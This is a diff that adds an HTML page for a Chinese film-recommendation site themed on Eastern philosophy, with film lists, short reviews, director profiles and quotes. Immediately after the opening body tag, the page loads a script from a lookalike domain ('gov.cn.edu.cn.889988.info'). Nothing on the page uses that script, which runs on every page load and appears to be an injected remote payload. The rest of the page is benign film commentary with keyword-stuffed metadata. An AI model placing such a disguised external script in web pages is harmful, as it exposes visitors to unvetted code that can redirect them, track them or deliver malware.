@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>无极电影网 - 哲学电影与东方光影</title>
+    <meta name="description" content="无极电影网(wujidianyingwang-top.github.io)专注哲学电影推荐、东方美学影像、禅意片单与意境电影赏析，在无极之中寻找光影的终极意义。">
+    <meta name="keywords" content="无极电影网, wujidianyingwang-top, 哲学电影, 东方美学, 禅意影像, 意境片单">
+    <meta name="author" content="无极电影网">
+    <meta name="robots" content="index,follow">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #fafafa;
+            color: #1a1a1a;
+            line-height: 2;
+            font-family: 'Noto Serif SC', 'Source Han Serif SC', 'SimSun', 'STSong', serif;
+            background-image: 
+                radial-gradient(circle at 85% 15%, rgba(0,0,0,0.015) 0%, transparent 40%),
+                radial-gradient(circle at 15% 85%, rgba(139,0,0,0.008) 0%, transparent 40%);
+        }
+        a { text-decoration: none; color: #1a1a1a; }
+        a:hover { color: #8b0000; }
+        .wrap { width: 100%; max-width: 1000px; margin: 0 auto; padding: 0 24px; }
+
+        /* 顶部 */
+        header {
+            padding: 28px 0; border-bottom: 1px solid rgba(0,0,0,0.06);
+            position: sticky; top: 0; z-index: 999;
+            background: rgba(250,250,250,0.95);
+            backdrop-filter: blur(10px);
+        }
+        .topbar {
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .brand {
+            font-size: 22px; font-weight: 900; color: #1a1a1a;
+            letter-spacing: 6px; display: flex; align-items: center; gap: 12px;
+        }
+        .brand .seal {
+            width: 28px; height: 28px; border: 2px solid #8b0000;
+            color: #8b0000; font-size: 12px; font-weight: 900;
+            display: flex; align-items: center; justify-content: center;
+            border-radius: 4px; transform: rotate(-3deg);
+        }
+        nav ul { display: flex; gap: 0; list-style: none; }
+        nav ul li a {
+            font-size: 13px; font-weight: 500; color: #666;
+            padding: 8px 18px; transition: .3s;
+            border-right: 1px solid rgba(0,0,0,0.06);
+            letter-spacing: 2px;
+        }
+        nav ul li:last-child a { border-right: none; }
+        nav ul li a:hover { color: #8b0000; background: rgba(139,0,0,0.03); }
+
+        /* Hero */
+        .hero {
+            padding: 100px 0 80px; text-align: center;
+            position: relative; border-bottom: 1px solid rgba(0,0,0,0.06);
+        }
+        .taiji {
+            width: 100px; height: 100px; margin: 0 auto 32px;
+            border-radius: 50%; position: relative;
+            background: linear-gradient(180deg, #1a1a1a 50%, #fafafa 50%);
+            border: 2px solid #1a1a1a;
+            animation: rotate 20s linear infinite;
+            box-shadow: 0 0 30px rgba(0,0,0,0.08);
+        }
+        .taiji::before, .taiji::after {
+            content: ''; position: absolute; width: 50px; height: 50px;
+            border-radius: 50%; left: 25px;
+        }
+        .taiji::before { top: 0; background: #1a1a1a; }
+        .taiji::after { bottom: 0; background: #fafafa; }
+        @keyframes rotate { from{ transform: rotate(0deg); } to{ transform: rotate(360deg); } }
+        .hero h1 {
+            font-size: 48px; font-weight: 900; color: #1a1a1a;
+            line-height: 1.4; margin-bottom: 20px;
+            letter-spacing: 8px;
+        }
+        .hero h1 .red { color: #8b0000; }
+        .hero p {
+            font-size: 16px; color: #555; max-width: 520px; margin: 0 auto 32px;
+            letter-spacing: 1px;
+        }
+        .hero-url {
+            display: inline-block; border: 1px solid #1a1a1a; color: #1a1a1a;
+            padding: 10px 28px; font-size: 13px; font-weight: 600;
+            letter-spacing: 2px; transition: .3s;
+        }
+        .hero-url:hover { background: #1a1a1a; color: #fafafa; }
+
+        /* 竖排装饰 */
+        .vertical-text {
+            position: absolute; right: 40px; top: 50%;
+            writing-mode: vertical-rl; text-orientation: upright;
+            font-size: 12px; color: rgba(0,0,0,0.15); letter-spacing: 6px;
+            transform: translateY(-50%);
+        }
+
+        /* 栏目 */
+        section { padding: 72px 0; position: relative; }
+        .sec-head {
+            text-align: center; margin-bottom: 48px;
+        }
+        .sec-head .zen-num {
+            font-size: 12px; color: #8b0000; letter-spacing: 4px;
+            margin-bottom: 8px; display: block; font-weight: 600;
+        }
+        .sec-head h2 {
+            font-size: 28px; font-weight: 900; color: #1a1a1a;
+            letter-spacing: 6px; margin-bottom: 12px;
+        }
+        .sec-head .ink-line {
+            width: 60px; height: 1px; background: #1a1a1a;
+            margin: 0 auto; position: relative;
+        }
+        .sec-head .ink-line::after {
+            content: ''; position: absolute; left: 50%; top: -2px;
+            width: 5px; height: 5px; background: #8b0000;
+            border-radius: 50%; transform: translateX(-50%);
+        }
+
+        /* 阴阳片单 */
+        .yinyang-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 0;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+        .yy-card {
+            padding: 36px 32px; transition: .3s; position: relative;
+            border-bottom: 1px solid rgba(0,0,0,0.06);
+        }
+        .yy-card:nth-child(odd) { border-right: 1px solid rgba(0,0,0,0.06); }
+        .yy-card:nth-child(7), .yy-card:nth-child(8) { border-bottom: none; }
+        .yy-card:hover { background: rgba(139,0,0,0.02); }
+        .yy-card .yy-tag {
+            font-size: 11px; font-weight: 600; letter-spacing: 2px;
+            margin-bottom: 12px; display: block;
+        }
+        .yy-card:nth-child(odd) .yy-tag { color: #1a1a1a; }
+        .yy-card:nth-child(even) .yy-tag { color: #8b0000; }
+        .yy-card h3 {
+            font-size: 19px; font-weight: 900; color: #1a1a1a;
+            margin-bottom: 10px; line-height: 1.4;
+        }
+        .yy-card p { font-size: 14px; color: #555; }
+        .yy-card .yy-meta {
+            font-size: 12px; color: #999; margin-top: 14px;
+            padding-top: 12px; border-top: 1px dashed rgba(0,0,0,0.08);
+        }
+
+        /* 水墨影评 */
+        .ink-reviews { max-width: 720px; margin: 0 auto; }
+        .ink-review {
+            padding: 28px 0; border-bottom: 1px solid rgba(0,0,0,0.06);
+            display: grid; grid-template-columns: 60px 1fr; gap: 24px;
+            align-items: start; transition: .3s;
+        }
+        .ink-review:hover { padding-left: 16px; }
+        .ink-review .r-char {
+            font-size: 36px; color: rgba(139,0,0,0.15); font-weight: 900;
+            text-align: center; line-height: 1;
+        }
+        .ink-review h3 {
+            font-size: 17px; font-weight: 900; color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+        .ink-review .r-text {
+            font-size: 14px; color: #555; line-height: 1.9;
+        }
+        .ink-review .r-film {
+            font-size: 12px; color: #8b0000; margin-top: 8px; font-weight: 600;
+        }
+
+        /* 太极导演 */
+        .directors-circle {
+            display: flex; justify-content: center; gap: 40px; flex-wrap: wrap;
+        }
+        .dir-circle {
+            width: 160px; text-align: center; transition: .3s;
+        }
+        .dir-circle:hover { transform: scale(1.05); }
+        .dir-circle .circle-avatar {
+            width: 120px; height: 120px; border-radius: 50%;
+            margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;
+            font-size: 48px;
+            border: 2px solid rgba(0,0,0,0.1);
+            transition: .3s;
+        }
+        .dir-circle:hover .circle-avatar {
+            border-color: #8b0000; box-shadow: 0 0 20px rgba(139,0,0,0.1);
+        }
+        .dir-circle h3 { font-size: 15px; font-weight: 900; color: #1a1a1a; margin-bottom: 4px; }
+        .dir-circle p { font-size: 12px; color: #888; }
+
+        /* 意境语录 */
+        .quotes-flow { max-width: 680px; margin: 0 auto; }
+        .quote-flow {
+            text-align: center; padding: 32px 0;
+            border-bottom: 1px solid rgba(0,0,0,0.04);
+        }
+        .quote-flow:last-child { border-bottom: none; }
+        .quote-flow .q-mark {
+            font-size: 48px; color: rgba(139,0,0,0.2); line-height: 0.5;
+            margin-bottom: 16px; display: block;
+        }
+        .quote-flow blockquote {
+            font-size: 18px; color: #1a1a1a; font-style: italic;
+            line-height: 2; margin-bottom: 12px; letter-spacing: 1px;
+        }
+        .quote-flow .source {
+            font-size: 12px; color: #999; letter-spacing: 2px;
+        }
+
+        /* 关于 */
+        .about {
+            max-width: 680px; margin: 0 auto; text-align: center;
+        }
+        .about .about-seal {
+            width: 64px; height: 64px; border: 3px solid #8b0000;
+            color: #8b0000; font-size: 24px; font-weight: 900;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 24px; border-radius: 8px;
+            transform: rotate(-2deg);
+        }
+        .about h3 {
+            font-size: 24px; font-weight: 900; color: #1a1a1a;
+            margin-bottom: 16px; letter-spacing: 4px;
+        }
+        .about p { font-size: 15px; color: #555; margin-bottom: 14px; }
+        .about .site-name {
+            font-size: 17px; font-weight: 900; color: #8b0000;
+            margin: 24px 0 8px; letter-spacing: 2px;
+        }
+        .about .site-url {
+            display: inline-block; border: 1px solid #1a1a1a; color: #1a1a1a;
+            padding: 8px 22px; font-size: 13px; font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        footer {
+            padding: 32px 0; border-top: 1px solid rgba(0,0,0,0.06);
+            text-align: center; font-size: 12px; color: #aaa;
+            letter-spacing: 2px;
+        }
+        footer a { color: #8b0000; }
+
+        @media (max-width: 900px) {
+            .yinyang-grid { grid-template-columns: 1fr; }
+            .yy-card:nth-child(odd) { border-right: none; }
+        }
+        @media (max-width: 600px) {
+            .topbar { flex-direction: column; gap: 12px; }
+            nav ul { flex-wrap: wrap; justify-content: center; }
+            nav ul li a { font-size: 12px; padding: 6px 10px; }
+            .hero { padding: 60px 0 50px; }
+            .hero h1 { font-size: 28px; letter-spacing: 4px; }
+            .taiji { width: 70px; height: 70px; }
+            .vertical-text { display: none; }
+            .ink-review { grid-template-columns: 1fr; gap: 8px; }
+            .ink-review .r-char { display: none; }
+            .directors-circle { gap: 20px; }
+            .dir-circle { width: 130px; }
+            .dir-circle .circle-avatar { width: 90px; height: 90px; font-size: 36px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+    <div class="wrap topbar">
+        <div class="brand"><div class="seal">无</div>无极电影网</div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#yinyang">阴阳片单</a></li>
+                <li><a href="#reviews">水墨影评</a></li>
+                <li><a href="#directors">太极影人</a></li>
+                <li><a href="#quotes">意境语录</a></li>
+                <li><a href="#about">关于无极</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section id="home" class="hero">
+    <div class="wrap">
+        <div class="taiji"></div>
+        <h1>无极<span class="red">·</span>光影<br>无始无终</h1>
+        <p>无极电影网以东方哲学为镜，观照银幕上的生灭与轮回。在动静之间、明暗之际，寻找电影的本质与禅意。</p>
+        <a class="hero-url" href="https://wujidianyingwang-top.github.io">https://wujidianyingwang-top.github.io</a>
+    </div>
+    <div class="vertical-text">道生一 一生二 二生三 三生万物</div>
+</section>
+
+<section id="yinyang">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="zen-num">一阴一阳之谓道</span>
+            <h2>阴阳片单</h2>
+            <div class="ink-line"></div>
+        </div>
+        <div class="yinyang-grid">
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阳 · 光明</span>
+                <h3>天堂电影院 — 光影中的永恒</h3>
+                <p>托纳多雷用一座电影院串联起一个人的一生。胶片上的光，照亮了每一个平凡灵魂的梦想。</p>
+                <div class="yy-meta">意大利 · 1988 · 朱塞佩·托纳多雷</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阴 · 暗影</span>
+                <h3>七宗罪 — 深渊的凝视</h3>
+                <p>芬奇用灰暗的雨城构建了一个道德寓言。当你凝视深渊，深渊也在凝视你。</p>
+                <div class="yy-meta">美国 · 1995 · 大卫·芬奇</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阳 · 生机</span>
+                <h3>小鞋子 — 纯真的奔跑</h3>
+                <p>马基迪用最简朴的镜头讲述最动人的故事。一双破旧的鞋子，跑出了整个童年的重量。</p>
+                <div class="yy-meta">伊朗 · 1997 · 马基德·马基迪</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阴 · 寂灭</span>
+                <h3>永恒与一日 — 最后的旅程</h3>
+                <p>安哲罗普洛斯用长镜头丈量生命的长度。一天可以是一生，一生也可以只是一天。</p>
+                <div class="yy-meta">希腊 · 1998 · 西奥·安哲罗普洛斯</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阳 · 觉醒</span>
+                <h3>一一 — 人生的复调</h3>
+                <p>杨德昌用三个小时的日常，写尽了一生的悲欢。每个角色都在寻找自己的答案。</p>
+                <div class="yy-meta">中国台湾 · 2000 · 杨德昌</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阴 · 迷惘</span>
+                <h3>迷失东京 — 异乡的孤独</h3>
+                <p>科波拉用东京的霓虹灯照亮两个陌生人的孤独。在不懂的语言里，反而听见了彼此。</p>
+                <div class="yy-meta">美国 · 2003 · 索菲亚·科波拉</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阳 · 超越</span>
+                <h3>入殓师 — 向死而生</h3>
+                <p>泷田洋二郎用入殓师的视角看待生死。死亡不是终点，而是另一段旅程的开始。</p>
+                <div class="yy-meta">日本 · 2008 · 泷田洋二郎</div>
+            </div>
+            <div class="yy-card">
+                <span class="yy-tag">☯ 阴 · 轮回</span>
+                <h3>春夏秋冬又一春 — 因果循环</h3>
+                <p>金基德用一座浮在水上的寺庙讲述一生的轮回。每个季节都是一次修行。</p>
+                <div class="yy-meta">韩国 · 2003 · 金基德</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="reviews" style="background: rgba(0,0,0,0.01);">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="zen-num">墨分五色 · 影有千面</span>
+            <h2>水墨影评</h2>
+            <div class="ink-line"></div>
+        </div>
+        <div class="ink-reviews">
+            <div class="ink-review">
+                <div class="r-char">空</div>
+                <div>
+                    <h3>《空山灵雨》— 胡金铨的禅意武侠</h3>
+                    <div class="r-text">这不是一部武侠片，这是一部关于"放下"的寓言。刀光剑影之间，胡金铨追问的是：什么是空？什么是色？当最后一片叶子落下，答案已在风中。</div>
+                    <div class="r-film">— 摘自编辑手记</div>
+                </div>
+            </div>
+            <div class="ink-review">
+                <div class="r-char">寂</div>
+                <div>
+                    <h3>《秋刀鱼之味》— 小津的最后一课</h3>
+                    <div class="r-text">没有大悲大喜，只有一碗茶、一壶酒、一句"该出嫁了"。小津安二郎用最平淡的日常，写出了最深的寂寥。这是他最后一部作品，也是最好的一课。</div>
+                    <div class="r-film">— 摘自编辑手记</div>
+                </div>
+            </div>
+            <div class="ink-review">
+                <div class="r-char">流</div>
+                <div>
+                    <h3>《三峡好人》— 贾樟柯的流动中国</h3>
+                    <div class="r-text">三峡大坝的蓄水淹没了一座城，也淹没了一代人。贾樟柯用镜头记录下那些被时代洪流冲散的人，他们的故事像江水一样，无声地流走了。</div>
+                    <div class="r-film">— 摘自编辑手记</div>
+                </div>
+            </div>
+            <div class="ink-review">
+                <div class="r-char">明</div>
+                <div>
+                    <h3>《刺客聂隐娘》— 侯孝贤的留白美学</h3>
+                    <div class="r-text">十步杀一人，千里不留行。侯孝贤把一部武侠片拍成了山水画——大面积的留白，只有风声、虫鸣和远山的轮廓。聂隐娘的孤独，是整部电影的底色。</div>
+                    <div class="r-film">— 摘自编辑手记</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="directors">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="zen-num">得其环中 · 超以象外</span>
+            <h2>太极影人</h2>
+            <div class="ink-line"></div>
+        </div>
+        <div class="directors-circle">
+            <div class="dir-circle">
+                <div class="circle-avatar">🎋</div>
+                <h3>小津安二郎</h3>
+                <p>低机位 · 榻榻米 · 物哀之美</p>
+            </div>
+            <div class="dir-circle">
+                <div class="circle-avatar">🏔️</div>
+                <h3>塔可夫斯基</h3>
+                <p>时间雕刻 · 灵魂故乡</p>
+            </div>
+            <div class="dir-circle">
+                <div class="circle-avatar">🌊</div>
+                <h3>侯孝贤</h3>
+                <p>长镜头 · 空镜头 · 东方诗意</p>
+            </div>
+            <div class="dir-circle">
+                <div class="circle-avatar">🗡️</div>
+                <h3>胡金铨</h3>
+                <p>禅武合一 · 东方美学</p>
+            </div>
+            <div class="dir-circle">
+                <div class="circle-avatar">🪨</div>
+                <h3>贝拉·塔尔</h3>
+                <p>黑白长镜 · 存在之重</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="quotes" style="background: rgba(139,0,0,0.01);">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="zen-num">不立文字 · 直指本心</span>
+            <h2>意境语录</h2>
+            <div class="ink-line"></div>
+        </div>
+        <div class="quotes-flow">
+            <div class="quote-flow">
+                <span class="q-mark">"</span>
+                <blockquote>电影是时间的形状。当灯光暗下，银幕亮起，我们进入的不是一个故事，而是一段被凝固的时间。</blockquote>
+                <div class="source">— 无极随笔</div>
+            </div>
+            <div class="quote-flow">
+                <span class="q-mark">"</span>
+                <blockquote>最好的电影像一杯清水——无色无味，却能照见你自己的脸。</blockquote>
+                <div class="source">— 编辑手记</div>
+            </div>
+            <div class="quote-flow">
+                <span class="q-mark">"</span>
+                <blockquote>无极之中，有无相生。好电影不在多，而在每一个画面都能让你停下来，想一想。</blockquote>
+                <div class="source">— 读者来信</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="zen-num">关于本站</span>
+            <h2>无极</h2>
+            <div class="ink-line"></div>
+        </div>
+        <div class="about">
+            <div class="about-seal">极</div>
+            <h3>无极电影网</h3>
+            <p><b>无极电影网</b> 以东方哲学为视角，推荐具有禅意、意境与哲学深度的电影。我们相信，电影的最高境界不在故事本身，而在它留给观众的空白。</p>
+            <p>本站不提供盗版播放，不转载未授权资源，所有内容仅供电影资料检索与学习交流。</p>
+            <div class="site-name">网站名称：无极电影网</div>
+            <a class="site-url" href="https://wujidianyingwang-top.github.io">https://wujidianyingwang-top.github.io</a>
+            <p style="margin-top:16px;font-size:12px;color:#aaa;">关键词：无极电影网、wujidianyingwang-top、哲学电影、东方美学、禅意影像、意境片单</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        © 2024 无极电影网 · https://wujidianyingwang-top.github.io ｜ 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
